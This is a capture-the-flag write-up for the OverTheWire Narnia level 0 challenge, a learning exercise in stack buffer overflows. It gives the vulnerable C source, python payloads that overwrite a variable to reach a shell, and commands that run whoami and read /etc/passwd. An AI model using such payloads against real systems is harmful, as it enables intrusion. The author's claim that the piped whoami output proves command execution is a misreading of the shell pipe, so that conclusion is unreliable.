
#Narnia0

narnia.labs.overthewire.org

**Username:** narnia0
**Password:** narnia0
**Description:**  
> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

> Before we do anything, let's go ahead and run the program and see what it does.
>
>```
># ./narnia0  
>Correct val's value from 0x41414141 -> 0xdeadbeef!  
>Here is your chance: AAAAAAAA  
>buf: AAAAAAAA  
>val: 0x41414141  
>WAY OFF!!!!  
>```
> Ok, it basically just tell's us that we need to correct a value and asks for input.  After accepting the input it looks like it just tells us the value that we submitted and the value of the area we are supposed to overwrite.
>
> Let's go ahead and take a peek at the source:
>
>```C
>/*
>    This program is free software; you can redistribute it and/or modify
>    it under the terms of the GNU General Public License as published by
>    the Free Software Foundation; either version 2 of the License, or
>    (at your option) any later version.
>
>    This program is distributed in the hope that it will be useful,
>    but WITHOUT ANY WARRANTY; without even the implied warranty of
>    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
>    GNU General Public License for more details.
>
>    You should have received a copy of the GNU General Public License
>    along with this program; if not, write to the Free Software
>    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
>*/
>#include <stdio.h>
>#include <stdlib.h>
>
>int main(){
>	long val=0x41414141;
>	char buf[20];
>
>	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
>	printf("Here is your chance: ");
>	scanf("%24s",&buf);
>
>	printf("buf: %s\n",buf);
>	printf("val: 0x%08x\n",val);
>
>	if(val==0xdeadbeef)
>		system("/bin/sh");
>	else {
>		printf("WAY OFF!!!!\n");
>		exit(1);
>	}
>
>	return 0;
>}
>```
>
> Alright, we can see the declaration of the buffer ```char buf[20];``` and where the input is read in ```scanf("%24s",&buf);```.  It also looks like if we get our values correct that we will be rewarded quite generously with a shell.  How nice! Let's play around with this new information a bit.  If the buffer was only supposed to be 20 characters, let's see what happens when our input is 21 characters, but since it looks like the buffer we want to overwrite has ```0x41414141``` already in it we are going to have to use another letter besides ```A``` as our input. We'll settle for ```R```.  Just as a quick side note, rather than inputting the values by hand each time let's utilize python to make life easier and just pipe in the input.
>
>```
># python -c 'print "R"*21' | ./narnia0  
>Correct val's value from 0x41414141 -> 0xdeadbeef!  
>Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRR  
>val: 0x41410052  
>WAY OFF!!!!  
>```
>
> Hmm, it looks like we overwrote one character with the null value at the end of the input overwriting a second.  It also looks like it started overwriting from the back, so we'll need to remember to take the endianness into account for our final input.  Let's try overwriting all 4 characters of the buffer.
>
>```
># python -c 'print "R"*24' | ./narnia0  
>Correct val's value from 0x41414141 -> 0xdeadbeef!  
>Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRRRRR  
>val: 0x52525252  
>WAY OFF!!!!  
>```
>
> Perfect, we overwrote the whole buffer with our input.  Now, lets start trying to fit ```0xdeadbeef``` in there.  Since the hex values for ```0xdeadbeef``` don't match up to ascii characters we need a way to insert them as input.  We are already using python for the repetitive input, let's just back off our number of ```R``` and tag on hex values to the end of that string and see what it does.
>
>```
># python -c 'print "R"*20+"\xde\xad\xbe\xef"' | ./narnia0  
>Correct val's value from 0x41414141 -> 0xdeadbeef!  
>Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRޭ�  
>val: 0xefbeadde  
>WAY OFF!!!!  
>```
> Our buffer shows that we inserted ```RRRRRRRRRRRRRRRRRRRRޭ�``` which we obviously wouldn't have been able to type in.  However, we forget about the little endian part and our values aren't in the correct order.  Let's fix that.
>
>```
># python -c 'print "R"*20+"\xef\xbe\xad\xde"' | ./narnia0  
>Correct val's value from 0x41414141 -> 0xdeadbeef!  
>Here is your chance: buf: RRRRRRRRRRRRRRRRRRRRﾭ  
>val: 0xdeadbeef  
>```
>
> Well, we didn't get the ```WAY OFF!!!``` message, but no shell. I actually spent a good bit of time at this stage, but learned a few key concepts in doing so.  The shell is being launched, but the problem is it's exiting before we have a chance to run anything.  We can prove that by trying to concatenate a second command to run.
> 
>```
># python -c 'print "R"*20+"\xef\xbe\xad\xde"';whoami | ./narnia0  
>RRRRRRRRRRRRRRRRRRRRﾭ  
>Correct val's value from 0x41414141 -> 0xdeadbeef!  
>Here is your chance: buf: root  
>val: 0x41414141  
>WAY OFF!!!!  
>```
>
> We can see that when it shows us what the buf looks like it shows ```root``` which is the result of the whoami command.  We can try a few other things too.
>
>```
># python -c 'print "R"*20+"\xef\xbe\xad\xde"';cat /etc/passwd | ./narnia0  
>RRRRRRRRRRRRRRRRRRRRﾭ  
>Correct val's value from 0x41414141 -> 0xdeadbeef!  
>Here is your chance: buf: root:x:0:0:root:/root:/b  
>val: 0x622f3a74  
>WAY OFF!!!!  
>```
>
> Clearly we are able to run commands.  Up to now, I have been running this locally, so let's see if we can do this on the server and find the flag.
